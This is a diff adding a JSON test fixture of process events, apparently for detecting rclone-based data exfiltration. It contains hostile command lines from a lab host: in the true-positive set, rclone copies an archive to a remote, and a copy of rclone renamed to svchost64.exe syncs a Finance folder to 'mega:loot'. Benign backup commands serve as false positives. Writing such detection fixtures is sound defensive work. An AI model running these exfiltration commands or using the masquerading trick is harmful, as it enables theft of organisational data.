@@ -1,0 +1,43 @@
+{
+  "tp": [
+    {
+      "Image": "C:\\Users\\Public\\rclone.exe",
+      "CommandLine": "rclone.exe copy C:\\Users\\Public\\f.7z remote:bkp --transfers 8",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "User": "LAB\\jdoe",
+      "Computer": "WS-FIN-07.lab.example"
+    },
+    {
+      "Image": "C:\\ProgramData\\svchost64.exe",
+      "CommandLine": "svchost64.exe sync C:\\Finance mega:loot -q",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "User": "LAB\\jdoe",
+      "Computer": "WS-FIN-07.lab.example",
+      "OriginalFileName": "rclone.exe",
+      "Description": "Rsync for cloud storage"
+    }
+  ],
+  "fp": [
+    {
+      "Image": "C:\\Tools\\rclone.exe",
+      "CommandLine": "rclone.exe copy C:\\Backups s3:corp-backups --dry-run",
+      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
+      "User": "LAB\\jdoe",
+      "Computer": "WS-FIN-07.lab.example"
+    },
+    {
+      "Image": "C:\\Tools\\rclone.exe",
+      "CommandLine": "rclone.exe version",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "User": "LAB\\jdoe",
+      "Computer": "WS-FIN-07.lab.example"
+    },
+    {
+      "Image": "C:\\Windows\\System32\\robocopy.exe",
+      "CommandLine": "robocopy.exe C:\\Data D:\\Data /MIR copy ",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "User": "LAB\\jdoe",
+      "Computer": "WS-FIN-07.lab.example"
+    }
+  ]
+}
